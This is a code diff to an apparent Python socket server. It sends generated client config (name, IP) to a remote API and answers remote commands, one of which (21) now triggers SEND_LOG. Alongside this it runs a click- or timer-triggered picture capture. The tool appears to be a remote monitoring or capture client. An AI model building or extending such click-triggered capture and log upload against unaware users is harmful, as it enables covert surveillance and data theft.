@@ -39,6 +39,9 @@ class Main_Sub_Server_Socket:
                 generate_config = client_config()
                 generated_config = await generate_config.ainit()
                 if not generated_config: raise Exception()
+                
+                #Send config to API
+                send_api(URL, generate_config)
             else: 
                 generate_config = await load_env()
             
@@ -58,12 +61,9 @@ class Main_Sub_Server_Socket:
             ## /!\ Start subprocess server /!\ ###
             try:
                 server_output_thread.start()
-            except: return await self.ainit(force=True,PATH_JSON=PATH_JSON,PATH_LOG=PATH_LOG,URL=URL) #if error, restart the main function
+            except: return await self.ainit(PATH_JSON=PATH_JSON,PATH_LOG=PATH_LOG,URL=URL) #if error, restart the main function
             ## /!\ Start subprocess server /!\ ###
             
-            #when all is good, we can send data to api ---------------------------------DONT LOST THAT NAGIB :D -----------------------------
-            send_api(URL, generate_config)
-            # print("Server started")
             
             #Start capture
             generate_capture = capture(path_json=PATH_JSON,path_log=PATH_LOG,name=generate_config["NAME"],ip=generate_config["IP"])
@@ -186,18 +186,21 @@ class Main_Sub_Server_Socket:
                                             if not PICTURE_MODE(mode="CLICK",timer=timer_selected,path=PATH_JSON):print("Error")
                                             else: print("Timer set to {} clicks.".format(timer_selected))
                                     elif commande == 21:
-                                        pass
+                                        SEND_LOG()
+                                    elif commande == 22:pass
                                     else: print("Not implemented")
                                     line = None
         except kill:pass                       
         except ResetConfigException:
-            RESET_CONFIG(server_process=server_process)
-            return await self.ainit(force=True,PATH_JSON=PATH_JSON,PATH_LOG=PATH_LOG,URL=URL) 
+            # RESET_CONFIG(server_process=server_process)
+            # return await self.ainit(force=True,PATH_JSON=PATH_JSON,PATH_LOG=PATH_LOG,URL=URL)
+            return await self.ainit(PATH_JSON=PATH_JSON,PATH_LOG=PATH_LOG,URL=URL)
         except Exception as err: print(err)
         finally: 
-            RESET_CONFIG(server_process=server_process)
+            # RESET_CONFIG(server_process=server_process)
             print("[x] - Server close") # Signal the end of the thread
-            return await self.ainit(force=True,PATH_JSON=PATH_JSON,PATH_LOG=PATH_LOG,URL=URL)
+            # return await self.ainit(force=True,PATH_JSON=PATH_JSON,PATH_LOG=PATH_LOG,URL=URL)
+            return await self.ainit(PATH_JSON=PATH_JSON,PATH_LOG=PATH_LOG,URL=URL)
 
 if sys.argv[0] == 'm_server.py':
     """ Run the server with arguments """
